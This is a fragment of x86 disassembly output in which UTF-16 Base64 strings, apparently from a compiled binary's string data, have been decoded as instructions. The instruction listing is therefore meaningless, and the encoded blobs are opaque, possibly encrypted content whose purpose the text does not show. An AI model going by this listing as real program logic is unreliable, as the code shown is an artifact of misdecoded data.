  40b915:	67 00 6e 00          	add    %ch,0x0(%bp)
  40b919:	78 00                	js     0x40b91b
  40b91b:	32 00                	xor    (%eax),%al
  40b91d:	72 00                	jb     0x40b91f
  40b91f:	57                   	push   %edi
  40b920:	00 73 00             	add    %dh,0x0(%ebx)
  40b923:	65 00 36             	add    %dh,%gs:(%esi)
  40b926:	00 6a 00             	add    %ch,0x0(%edx)
  40b929:	35 00 5a 00 45       	xor    $0x45005a00,%eax
  40b92e:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40b932:	00 32                	add    %dh,(%edx)
  40b934:	00 32                	add    %dh,(%edx)
  40b936:	00 30                	add    %dh,(%eax)
  40b938:	00 76 00             	add    %dh,0x0(%esi)
  40b93b:	54                   	push   %esp
  40b93c:	00 62 00             	add    %ah,0x0(%edx)
  40b93f:	48                   	dec    %eax
  40b940:	00 61 00             	add    %ah,0x0(%ecx)
  40b943:	4f                   	dec    %edi
  40b944:	00 70 00             	add    %dh,0x0(%eax)
  40b947:	59                   	pop    %ecx
  40b948:	00 4b 00             	add    %cl,0x0(%ebx)
  40b94b:	34 00                	xor    $0x0,%al
  40b94d:	41                   	inc    %ecx
  40b94e:	00 77 00             	add    %dh,0x0(%edi)
  40b951:	6c                   	insb   (%dx),%es:(%edi)
  40b952:	00 4e 00             	add    %cl,0x0(%esi)
  40b955:	32 00                	xor    (%eax),%al
  40b957:	45                   	inc    %ebp
  40b958:	00 30                	add    %dh,(%eax)
  40b95a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b95d:	71 00                	jno    0x40b95f
  40b95f:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40b963:	6e                   	outsb  %ds:(%esi),(%dx)
  40b964:	00 53 00             	add    %dl,0x0(%ebx)
  40b967:	34 00                	xor    $0x0,%al
  40b969:	33 00                	xor    (%eax),%eax
  40b96b:	4d                   	dec    %ebp
  40b96c:	00 45 00             	add    %al,0x0(%ebp)
  40b96f:	71 00                	jno    0x40b971
  40b971:	4e                   	dec    %esi
  40b972:	00 6b 00             	add    %ch,0x0(%ebx)
  40b975:	62 00                	bound  %eax,(%eax)
  40b977:	44                   	inc    %esp
  40b978:	00 38                	add    %bh,(%eax)
  40b97a:	00 35 00 33 00 67    	add    %dh,0x67003300
  40b980:	00 4f 00             	add    %cl,0x0(%edi)
  40b983:	44                   	inc    %esp
  40b984:	00 2b                	add    %ch,(%ebx)
  40b986:	00 57 00             	add    %dl,0x0(%edi)
  40b989:	79 00                	jns    0x40b98b
  40b98b:	69 00 5a 00 32 00    	imul   $0x32005a,(%eax),%eax
  40b991:	52                   	push   %edx
  40b992:	00 31                	add    %dh,(%ecx)
  40b994:	00 63 00             	add    %ah,0x0(%ebx)
  40b997:	4d                   	dec    %ebp
  40b998:	00 53 00             	add    %dl,0x0(%ebx)
  40b99b:	68 00 41 00 4d       	push   $0x4d004100
  40b9a0:	00 47 00             	add    %al,0x0(%edi)
  40b9a3:	6a 00                	push   $0x0
  40b9a5:	64 00 54 00 34       	add    %dl,%fs:0x34(%eax,%eax,1)
  40b9aa:	00 69 00             	add    %ch,0x0(%ecx)
  40b9ad:	4e                   	dec    %esi
  40b9ae:	00 75 00             	add    %dh,0x0(%ebp)
  40b9b1:	48                   	dec    %eax
  40b9b2:	00 75 00             	add    %dh,0x0(%ebp)
  40b9b5:	78 00                	js     0x40b9b7
  40b9b7:	6b 00 54             	imul   $0x54,(%eax),%eax
  40b9ba:	00 32                	add    %dh,(%edx)
  40b9bc:	00 47 00             	add    %al,0x0(%edi)
  40b9bf:	35 00 61 00 66       	xor    $0x66006100,%eax
  40b9c4:	00 32                	add    %dh,(%edx)
  40b9c6:	00 77 00             	add    %dh,0x0(%edi)
  40b9c9:	51                   	push   %ecx
  40b9ca:	00 56 00             	add    %dl,0x0(%esi)
  40b9cd:	67 00 35             	add    %dh,(%di)
  40b9d0:	00 4a 00             	add    %cl,0x0(%edx)
  40b9d3:	6a 00                	push   $0x0
  40b9d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9d6:	00 35 00 2b 00 74    	add    %dh,0x74002b00
  40b9dc:	00 47 00             	add    %al,0x0(%edi)
  40b9df:	50                   	push   %eax
  40b9e0:	00 61 00             	add    %ah,0x0(%ecx)
  40b9e3:	42                   	inc    %edx
  40b9e4:	00 49 00             	add    %cl,0x0(%ecx)
  40b9e7:	4e                   	dec    %esi
  40b9e8:	00 57 00             	add    %dl,0x0(%edi)
  40b9eb:	58                   	pop    %eax
  40b9ec:	00 6a 00             	add    %ch,0x0(%edx)
  40b9ef:	35 00 68 00 71       	xor    $0x71006800,%eax
  40b9f4:	00 69 00             	add    %ch,0x0(%ecx)
  40b9f7:	31 00                	xor    %eax,(%eax)
  40b9f9:	6c                   	insb   (%dx),%es:(%edi)
  40b9fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9fd:	59                   	pop    %ecx
  40b9fe:	00 78 00             	add    %bh,0x0(%eax)
  40ba01:	51                   	push   %ecx
  40ba02:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40ba06:	00 61 00             	add    %ah,0x0(%ecx)
  40ba09:	63 00                	arpl   %eax,(%eax)
  40ba0b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba0c:	00 42 00             	add    %al,0x0(%edx)
  40ba0f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba10:	00 35 00 6b 00 37    	add    %dh,0x37006b00
  40ba16:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40ba1a:	00 2b                	add    %ch,(%ebx)
  40ba1c:	00 4e 00             	add    %cl,0x0(%esi)
  40ba1f:	31 00                	xor    %eax,(%eax)
  40ba21:	4a                   	dec    %edx
  40ba22:	00 76 00             	add    %dh,0x0(%esi)
  40ba25:	45                   	inc    %ebp
  40ba26:	00 36                	add    %dh,(%esi)
  40ba28:	00 59 00             	add    %bl,0x0(%ecx)
  40ba2b:	38 00                	cmp    %al,(%eax)
  40ba2d:	38 00                	cmp    %al,(%eax)
  40ba2f:	69 00 6e 00 4c 00    	imul   $0x4c006e,(%eax),%eax
  40ba35:	7a 00                	jp     0x40ba37
  40ba37:	4f                   	dec    %edi
  40ba38:	00 58 00             	add    %bl,0x0(%eax)
  40ba3b:	75 00                	jne    0x40ba3d
  40ba3d:	61                   	popa
  40ba3e:	00 77 00             	add    %dh,0x0(%edi)
  40ba41:	55                   	push   %ebp
  40ba42:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40ba46:	00 5a 00             	add    %bl,0x0(%edx)
  40ba49:	4c                   	dec    %esp
  40ba4a:	00 70 00             	add    %dh,0x0(%eax)
  40ba4d:	62 00                	bound  %eax,(%eax)
  40ba4f:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40ba53:	6b 00 51             	imul   $0x51,(%eax),%eax
  40ba56:	00 33                	add    %dh,(%ebx)
  40ba58:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba5b:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40ba5f:	4d                   	dec    %ebp
  40ba60:	00 52 00             	add    %dl,0x0(%edx)
  40ba63:	46                   	inc    %esi
  40ba64:	00 6e 00             	add    %ch,0x0(%esi)
  40ba67:	6a 00                	push   $0x0
  40ba69:	2f                   	das
  40ba6a:	00 57 00             	add    %dl,0x0(%edi)
  40ba6d:	74 00                	je     0x40ba6f
  40ba6f:	57                   	push   %edi
  40ba70:	00 71 00             	add    %dh,0x0(%ecx)
  40ba73:	2f                   	das
  40ba74:	00 39                	add    %bh,(%ecx)
  40ba76:	00 37                	add    %dh,(%edi)
  40ba78:	00 66 00             	add    %ah,0x0(%esi)
  40ba7b:	38 00                	cmp    %al,(%eax)
  40ba7d:	46                   	inc    %esi
  40ba7e:	00 69 00             	add    %ch,0x0(%ecx)
  40ba81:	48                   	dec    %eax
  40ba82:	00 2f                	add    %ch,(%edi)
  40ba84:	00 58 00             	add    %bl,0x0(%eax)
  40ba87:	4e                   	dec    %esi
  40ba88:	00 42 00             	add    %al,0x0(%edx)
  40ba8b:	61                   	popa
  40ba8c:	00 4a 00             	add    %cl,0x0(%edx)
  40ba8f:	59                   	pop    %ecx
  40ba90:	00 35 00 69 00 47    	add    %dh,0x47006900
  40ba96:	00 71 00             	add    %dh,0x0(%ecx)
  40ba99:	71 00                	jno    0x40ba9b
  40ba9b:	63 00                	arpl   %eax,(%eax)
  40ba9d:	48                   	dec    %eax
  40ba9e:	00 47 00             	add    %al,0x0(%edi)
  40baa1:	45                   	inc    %ebp
  40baa2:	00 68 00             	add    %ch,0x0(%eax)
  40baa5:	5a                   	pop    %edx
  40baa6:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40baaa:	00 53 00             	add    %dl,0x0(%ebx)
  40baad:	55                   	push   %ebp
  40baae:	00 41 00             	add    %al,0x0(%ecx)
  40bab1:	63 00                	arpl   %eax,(%eax)
  40bab3:	35 00 6b 00 57       	xor    $0x57006b00,%eax
  40bab8:	00 6b 00             	add    %ch,0x0(%ebx)
  40babb:	48                   	dec    %eax
  40babc:	00 7a 00             	add    %bh,0x0(%edx)
  40babf:	68 00 38 00 79       	push   $0x79003800
  40bac4:	00 51 00             	add    %dl,0x0(%ecx)
  40bac7:	2f                   	das
  40bac8:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  40bacc:	00 71 00             	add    %dh,0x0(%ecx)
  40bacf:	70 00                	jo     0x40bad1
  40bad1:	37                   	aaa
  40bad2:	00 46 00             	add    %al,0x0(%esi)
  40bad5:	49                   	dec    %ecx
  40bad6:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40bada:	00 70 00             	add    %dh,0x0(%eax)
  40badd:	34 00                	xor    $0x0,%al
  40badf:	4b                   	dec    %ebx
  40bae0:	00 79 00             	add    %bh,0x0(%ecx)
  40bae3:	2b 00                	sub    (%eax),%eax
  40bae5:	46                   	inc    %esi
  40bae6:	00 76 00             	add    %dh,0x0(%esi)
  40bae9:	63 00                	arpl   %eax,(%eax)
  40baeb:	4c                   	dec    %esp
  40baec:	00 4a 00             	add    %cl,0x0(%edx)
  40baef:	6a 00                	push   $0x0
  40baf1:	7a 00                	jp     0x40baf3
  40baf3:	45                   	inc    %ebp
  40baf4:	00 4e 00             	add    %cl,0x0(%esi)
  40baf7:	37                   	aaa
  40baf8:	00 58 00             	add    %bl,0x0(%eax)
  40bafb:	56                   	push   %esi
  40bafc:	00 39                	add    %bh,(%ecx)
  40bafe:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb01:	6a 00                	push   $0x0
  40bb03:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40bb07:	74 00                	je     0x40bb09
  40bb09:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40bb0d:	44                   	inc    %esp
  40bb0e:	00 75 00             	add    %dh,0x0(%ebp)
  40bb11:	73 00                	jae    0x40bb13
  40bb13:	4b                   	dec    %ebx
  40bb14:	00 78 00             	add    %bh,0x0(%eax)
  40bb17:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb18:	00 35 00 54 00 57    	add    %dh,0x57005400
  40bb1e:	00 46 00             	add    %al,0x0(%esi)
  40bb21:	62 00                	bound  %eax,(%eax)
  40bb23:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb24:	00 72 00             	add    %dh,0x0(%edx)
  40bb27:	63 00                	arpl   %eax,(%eax)
  40bb29:	2b 00                	sub    (%eax),%eax
  40bb2b:	43                   	inc    %ebx
  40bb2c:	00 33                	add    %dh,(%ebx)
  40bb2e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb31:	70 00                	jo     0x40bb33
  40bb33:	2f                   	das
  40bb34:	00 32                	add    %dh,(%edx)
  40bb36:	00 67 00             	add    %ah,0x0(%edi)
  40bb39:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb3d:	53                   	push   %ebx
  40bb3e:	00 45 00             	add    %al,0x0(%ebp)
  40bb41:	53                   	push   %ebx
  40bb42:	00 56 00             	add    %dl,0x0(%esi)
  40bb45:	41                   	inc    %ecx
  40bb46:	00 33                	add    %dh,(%ebx)
  40bb48:	00 2f                	add    %ch,(%edi)
  40bb4a:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40bb4e:	00 35 00 70 00 37    	add    %dh,0x37007000
  40bb54:	00 6a 00             	add    %ch,0x0(%edx)
  40bb57:	45                   	inc    %ebp
  40bb58:	00 33                	add    %dh,(%ebx)
  40bb5a:	00 56 00             	add    %dl,0x0(%esi)
  40bb5d:	68 00 59 00 50       	push   $0x50005900
  40bb62:	00 4a 00             	add    %cl,0x0(%edx)
  40bb65:	44                   	inc    %esp
  40bb66:	00 59 00             	add    %bl,0x0(%ecx)
  40bb69:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40bb6d:	37                   	aaa
  40bb6e:	00 67 00             	add    %ah,0x0(%edi)
  40bb71:	4b                   	dec    %ebx
  40bb72:	00 4b 00             	add    %cl,0x0(%ebx)
  40bb75:	69 00 36 00 7a 00    	imul   $0x7a0036,(%eax),%eax
  40bb7b:	58                   	pop    %eax
  40bb7c:	00 42 00             	add    %al,0x0(%edx)
  40bb7f:	76 00                	jbe    0x40bb81
  40bb81:	37                   	aaa
  40bb82:	00 35 00 41 00 59    	add    %dh,0x59004100
  40bb88:	00 41 00             	add    %al,0x0(%ecx)
  40bb8b:	4a                   	dec    %edx
  40bb8c:	00 33                	add    %dh,(%ebx)
  40bb8e:	00 43 00             	add    %al,0x0(%ebx)
  40bb91:	64 00 31             	add    %dh,%fs:(%ecx)
  40bb94:	00 69 00             	add    %ch,0x0(%ecx)
  40bb97:	31 00                	xor    %eax,(%eax)
  40bb99:	7a 00                	jp     0x40bb9b
  40bb9b:	74 00                	je     0x40bb9d
  40bb9d:	76 00                	jbe    0x40bb9f
  40bb9f:	65 00 74 00 53       	add    %dh,%gs:0x53(%eax,%eax,1)
  40bba4:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40bba8:	00 4a 00             	add    %cl,0x0(%edx)
  40bbab:	4a                   	dec    %edx
  40bbac:	00 67 00             	add    %ah,0x0(%edi)
  40bbaf:	46                   	inc    %esi
  40bbb0:	00 36                	add    %dh,(%esi)
  40bbb2:	00 69 00             	add    %ch,0x0(%ecx)
  40bbb5:	72 00                	jb     0x40bbb7
  40bbb7:	64 00 39             	add    %bh,%fs:(%ecx)
  40bbba:	00 63 00             	add    %ah,0x0(%ebx)
  40bbbd:	71 00                	jno    0x40bbbf
  40bbbf:	6c                   	insb   (%dx),%es:(%edi)
  40bbc0:	00 68 00             	add    %ch,0x0(%eax)
  40bbc3:	72 00                	jb     0x40bbc5
  40bbc5:	74 00                	je     0x40bbc7
  40bbc7:	49                   	dec    %ecx
  40bbc8:	00 58 00             	add    %bl,0x0(%eax)
  40bbcb:	69 00 74 00 32 00    	imul   $0x320074,(%eax),%eax
  40bbd1:	61                   	popa
  40bbd2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bbd6:	00 69 00             	add    %ch,0x0(%ecx)
  40bbd9:	68 00 6c 00 44       	push   $0x44006c00
  40bbde:	00 5a 00             	add    %bl,0x0(%edx)
  40bbe1:	79 00                	jns    0x40bbe3
  40bbe3:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40bbe7:	4e                   	dec    %esi
  40bbe8:	00 30                	add    %dh,(%eax)
  40bbea:	00 65 00             	add    %ah,0x0(%ebp)
  40bbed:	4a                   	dec    %edx
  40bbee:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbf1:	71 00                	jno    0x40bbf3
  40bbf3:	50                   	push   %eax
  40bbf4:	00 2f                	add    %ch,(%edi)
  40bbf6:	00 56 00             	add    %dl,0x0(%esi)
  40bbf9:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40bbfd:	77 00                	ja     0x40bbff
  40bbff:	61                   	popa
  40bc00:	00 73 00             	add    %dh,0x0(%ebx)
  40bc03:	74 00                	je     0x40bc05
  40bc05:	56                   	push   %esi
  40bc06:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40bc0a:	00 55 00             	add    %dl,0x0(%ebp)
  40bc0d:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40bc11:	4f                   	dec    %edi
  40bc12:	00 7a 00             	add    %bh,0x0(%edx)
  40bc15:	75 00                	jne    0x40bc17
  40bc17:	4e                   	dec    %esi
  40bc18:	00 6d 00             	add    %ch,0x0(%ebp)
  40bc1b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc1c:	00 75 00             	add    %dh,0x0(%ebp)
  40bc1f:	50                   	push   %eax
  40bc20:	00 5a 00             	add    %bl,0x0(%edx)
  40bc23:	52                   	push   %edx
  40bc24:	00 51 00             	add    %dl,0x0(%ecx)
  40bc27:	54                   	push   %esp
  40bc28:	00 4d 00             	add    %cl,0x0(%ebp)
  40bc2b:	39 00                	cmp    %eax,(%eax)
  40bc2d:	5a                   	pop    %edx
  40bc2e:	00 39                	add    %bh,(%ecx)
  40bc30:	00 70 00             	add    %dh,0x0(%eax)
  40bc33:	30 00                	xor    %al,(%eax)
  40bc35:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40bc39:	79 00                	jns    0x40bc3b
  40bc3b:	59                   	pop    %ecx
  40bc3c:	00 75 00             	add    %dh,0x0(%ebp)
  40bc3f:	75 00                	jne    0x40bc41
  40bc41:	7a 00                	jp     0x40bc43
  40bc43:	37                   	aaa
  40bc44:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40bc48:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40bc4c:	00 67 00             	add    %ah,0x0(%edi)
  40bc4f:	43                   	inc    %ebx
  40bc50:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40bc54:	00 69 00             	add    %ch,0x0(%ecx)
  40bc57:	39 00                	cmp    %eax,(%eax)
  40bc59:	68 00 61 00 4f       	push   $0x4f006100
  40bc5e:	00 58 00             	add    %bl,0x0(%eax)
  40bc61:	70 00                	jo     0x40bc63
  40bc63:	77 00                	ja     0x40bc65
  40bc65:	64 00 74 00 6f       	add    %dh,%fs:0x6f(%eax,%eax,1)
  40bc6a:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40bc6e:	00 76 00             	add    %dh,0x0(%esi)
  40bc71:	33 00                	xor    (%eax),%eax
  40bc73:	72 00                	jb     0x40bc75
  40bc75:	4d                   	dec    %ebp
  40bc76:	00 4a 00             	add    %cl,0x0(%edx)
  40bc79:	4f                   	dec    %edi
  40bc7a:	00 57 00             	add    %dl,0x0(%edi)
  40bc7d:	4e                   	dec    %esi
  40bc7e:	00 73 00             	add    %dh,0x0(%ebx)
  40bc81:	37                   	aaa
  40bc82:	00 67 00             	add    %ah,0x0(%edi)
  40bc85:	58                   	pop    %eax
  40bc86:	00 41 00             	add    %al,0x0(%ecx)
  40bc89:	54                   	push   %esp
  40bc8a:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40bc8e:	00 42 00             	add    %al,0x0(%edx)
  40bc91:	4a                   	dec    %edx
  40bc92:	00 39                	add    %bh,(%ecx)
  40bc94:	00 62 00             	add    %ah,0x0(%edx)
  40bc97:	4a                   	dec    %edx
  40bc98:	00 46 00             	add    %al,0x0(%esi)
  40bc9b:	69 00 4e 00 46 00    	imul   $0x46004e,(%eax),%eax
  40bca1:	48                   	dec    %eax
  40bca2:	00 57 00             	add    %dl,0x0(%edi)
  40bca5:	76 00                	jbe    0x40bca7
  40bca7:	57                   	push   %edi
  40bca8:	00 55 00             	add    %dl,0x0(%ebp)
  40bcab:	4d                   	dec    %ebp
  40bcac:	00 31                	add    %dh,(%ecx)
  40bcae:	00 4d 00             	add    %cl,0x0(%ebp)
  40bcb1:	55                   	push   %ebp
  40bcb2:	00 71 00             	add    %dh,0x0(%ecx)
  40bcb5:	6c                   	insb   (%dx),%es:(%edi)
  40bcb6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcb9:	4c                   	dec    %esp
  40bcba:	00 4a 00             	add    %cl,0x0(%edx)
  40bcbd:	76 00                	jbe    0x40bcbf
  40bcbf:	33 00                	xor    (%eax),%eax
  40bcc1:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bcc5:	4e                   	dec    %esi
  40bcc6:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40bcca:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40bcce:	00 38                	add    %bh,(%eax)
  40bcd0:	00 48 00             	add    %cl,0x0(%eax)
  40bcd3:	52                   	push   %edx
  40bcd4:	00 68 00             	add    %ch,0x0(%eax)
  40bcd7:	45                   	inc    %ebp
  40bcd8:	00 61 00             	add    %ah,0x0(%ecx)
  40bcdb:	54                   	push   %esp
  40bcdc:	00 7a 00             	add    %bh,0x0(%edx)
  40bcdf:	4b                   	dec    %ebx
  40bce0:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40bce4:	00 43 00             	add    %al,0x0(%ebx)
  40bce7:	5a                   	pop    %edx
  40bce8:	00 4e 00             	add    %cl,0x0(%esi)
  40bceb:	34 00                	xor    $0x0,%al
  40bced:	34 00                	xor    $0x0,%al
  40bcef:	56                   	push   %esi
  40bcf0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcf3:	70 00                	jo     0x40bcf5
  40bcf5:	59                   	pop    %ecx
  40bcf6:	00 53 00             	add    %dl,0x0(%ebx)
  40bcf9:	45                   	inc    %ebp
  40bcfa:	00 63 00             	add    %ah,0x0(%ebx)
  40bcfd:	61                   	popa
  40bcfe:	00 4f 00             	add    %cl,0x0(%edi)
  40bd01:	31 00                	xor    %eax,(%eax)
  40bd03:	79 00                	jns    0x40bd05
  40bd05:	6d                   	insl   (%dx),%es:(%edi)
  40bd06:	00 32                	add    %dh,(%edx)
  40bd08:	00 6a 00             	add    %ch,0x0(%edx)
  40bd0b:	48                   	dec    %eax
  40bd0c:	00 70 00             	add    %dh,0x0(%eax)
  40bd0f:	7a 00                	jp     0x40bd11
  40bd11:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd12:	00 38                	add    %bh,(%eax)
  40bd14:	00 48 00             	add    %cl,0x0(%eax)
  40bd17:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40bd1b:	54                   	push   %esp
  40bd1c:	00 30                	add    %dh,(%eax)
  40bd1e:	00 7a 00             	add    %bh,0x0(%edx)
  40bd21:	74 00                	je     0x40bd23
  40bd23:	4c                   	dec    %esp
  40bd24:	00 41 00             	add    %al,0x0(%ecx)
  40bd27:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd28:	00 62 00             	add    %ah,0x0(%edx)
  40bd2b:	31 00                	xor    %eax,(%eax)
  40bd2d:	74 00                	je     0x40bd2f
  40bd2f:	55                   	push   %ebp
  40bd30:	00 4f 00             	add    %cl,0x0(%edi)
  40bd33:	33 00                	xor    (%eax),%eax
  40bd35:	31 00                	xor    %eax,(%eax)
  40bd37:	30 00                	xor    %al,(%eax)
  40bd39:	71 00                	jno    0x40bd3b
  40bd3b:	34 00                	xor    $0x0,%al
  40bd3d:	6d                   	insl   (%dx),%es:(%edi)
  40bd3e:	00 70 00             	add    %dh,0x0(%eax)
  40bd41:	38 00                	cmp    %al,(%eax)
  40bd43:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40bd47:	68 00 32 00 34       	push   $0x34003200
  40bd4c:	00 37                	add    %dh,(%edi)
  40bd4e:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd51:	39 00                	cmp    %eax,(%eax)
  40bd53:	47                   	inc    %edi
  40bd54:	00 6b 00             	add    %ch,0x0(%ebx)
  40bd57:	4f                   	dec    %edi
  40bd58:	00 70 00             	add    %dh,0x0(%eax)
  40bd5b:	7a 00                	jp     0x40bd5d
  40bd5d:	63 00                	arpl   %eax,(%eax)
  40bd5f:	41                   	inc    %ecx
  40bd60:	00 67 00             	add    %ah,0x0(%edi)
  40bd63:	37                   	aaa
  40bd64:	00 67 00             	add    %ah,0x0(%edi)
  40bd67:	52                   	push   %edx
  40bd68:	00 73 00             	add    %dh,0x0(%ebx)
  40bd6b:	44                   	inc    %esp
  40bd6c:	00 56 00             	add    %dl,0x0(%esi)
  40bd6f:	6d                   	insl   (%dx),%es:(%edi)
  40bd70:	00 2b                	add    %ch,(%ebx)
  40bd72:	00 2b                	add    %ch,(%ebx)
  40bd74:	00 62 00             	add    %ah,0x0(%edx)
  40bd77:	79 00                	jns    0x40bd79
  40bd79:	57                   	push   %edi
  40bd7a:	00 55 00             	add    %dl,0x0(%ebp)
  40bd7d:	43                   	inc    %ebx
  40bd7e:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40bd82:	00 56 00             	add    %dl,0x0(%esi)
  40bd85:	59                   	pop    %ecx
  40bd86:	00 4a 00             	add    %cl,0x0(%edx)
  40bd89:	58                   	pop    %eax
  40bd8a:	00 6f 00             	add    %ch,0x0(%edi)
  40bd8d:	62 00                	bound  %eax,(%eax)
  40bd8f:	4c                   	dec    %esp
  40bd90:	00 63 00             	add    %ah,0x0(%ebx)
  40bd93:	7a 00                	jp     0x40bd95
  40bd95:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd96:	00 46 00             	add    %al,0x0(%esi)
  40bd99:	4d                   	dec    %ebp
  40bd9a:	00 43 00             	add    %al,0x0(%ebx)
  40bd9d:	46                   	inc    %esi
  40bd9e:	00 6e 00             	add    %ch,0x0(%esi)
  40bda1:	6f                   	outsl  %ds:(%esi),(%dx)
  40bda2:	00 47 00             	add    %al,0x0(%edi)
  40bda5:	75 00                	jne    0x40bda7
  40bda7:	63 00                	arpl   %eax,(%eax)
  40bda9:	68 00 4a 00 46       	push   $0x46004a00
  40bdae:	00 69 00             	add    %ch,0x0(%ecx)
  40bdb1:	6b 00 33             	imul   $0x33,(%eax),%eax
  40bdb4:	00 2f                	add    %ch,(%edi)
  40bdb6:	00 4f 00             	add    %cl,0x0(%edi)
  40bdb9:	47                   	inc    %edi
  40bdba:	00 48 00             	add    %cl,0x0(%eax)
  40bdbd:	56                   	push   %esi
  40bdbe:	00 6b 00             	add    %ch,0x0(%ebx)
  40bdc1:	6b 00 32             	imul   $0x32,(%eax),%eax
  40bdc4:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40bdc8:	00 4a 00             	add    %cl,0x0(%edx)
  40bdcb:	4f                   	dec    %edi
  40bdcc:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bdcf:	79 00                	jns    0x40bdd1
  40bdd1:	37                   	aaa
  40bdd2:	00 69 00             	add    %ch,0x0(%ecx)
  40bdd5:	62 00                	bound  %eax,(%eax)
  40bdd7:	36 00 32             	add    %dh,%ss:(%edx)
  40bdda:	00 77 00             	add    %dh,0x0(%edi)
  40bddd:	55                   	push   %ebp
  40bdde:	00 69 00             	add    %ch,0x0(%ecx)
  40bde1:	51                   	push   %ecx
  40bde2:	00 63 00             	add    %ah,0x0(%ebx)
  40bde5:	4e                   	dec    %esi
  40bde6:	00 70 00             	add    %dh,0x0(%eax)
  40bde9:	4c                   	dec    %esp
  40bdea:	00 47 00             	add    %al,0x0(%edi)
  40bded:	2f                   	das
  40bdee:	00 38                	add    %bh,(%eax)
  40bdf0:	00 55 00             	add    %dl,0x0(%ebp)
  40bdf3:	54                   	push   %esp
  40bdf4:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40bdf8:	00 67 00             	add    %ah,0x0(%edi)
  40bdfb:	5a                   	pop    %edx
  40bdfc:	00 4f 00             	add    %cl,0x0(%edi)
  40bdff:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40be03:	79 00                	jns    0x40be05
  40be05:	7a 00                	jp     0x40be07
  40be07:	6d                   	insl   (%dx),%es:(%edi)
  40be08:	00 6e 00             	add    %ch,0x0(%esi)
  40be0b:	62 00                	bound  %eax,(%eax)
  40be0d:	56                   	push   %esi
  40be0e:	00 73 00             	add    %dh,0x0(%ebx)
  40be11:	73 00                	jae    0x40be13
  40be13:	51                   	push   %ecx
  40be14:	00 51 00             	add    %dl,0x0(%ecx)
  40be17:	32 00                	xor    (%eax),%al
  40be19:	51                   	push   %ecx
  40be1a:	00 66 00             	add    %ah,0x0(%esi)
  40be1d:	45                   	inc    %ebp
  40be1e:	00 70 00             	add    %dh,0x0(%eax)
  40be21:	31 00                	xor    %eax,(%eax)
  40be23:	77 00                	ja     0x40be25
  40be25:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40be2a:	80 b1 69 00 6a 00 76 	xorb   $0x76,0x6a0069(%ecx)
  40be31:	00 35 00 65 00 59    	add    %dh,0x59006500
  40be37:	00 37                	add    %dh,(%edi)
  40be39:	00 77 00             	add    %dh,0x0(%edi)
  40be3c:	6a 00                	push   $0x0
  40be3e:	4a                   	dec    %edx
  40be3f:	00 69 00             	add    %ch,0x0(%ecx)
  40be42:	77 00                	ja     0x40be44
  40be44:	6e                   	outsb  %ds:(%esi),(%dx)
  40be45:	00 76 00             	add    %dh,0x0(%esi)
  40be48:	36 00 74 00 46       	add    %dh,%ss:0x46(%eax,%eax,1)
  40be4d:	00 39                	add    %bh,(%ecx)
  40be4f:	00 41 00             	add    %al,0x0(%ecx)
  40be52:	4c                   	dec    %esp
  40be53:	00 53 00             	add    %dl,0x0(%ebx)
  40be56:	52                   	push   %edx
  40be57:	00 6a 00             	add    %ch,0x0(%edx)
  40be5a:	6f                   	outsl  %ds:(%esi),(%dx)
  40be5b:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40be5f:	00 2f                	add    %ch,(%edi)
  40be61:	00 5a 00             	add    %bl,0x0(%edx)
  40be64:	43                   	inc    %ebx
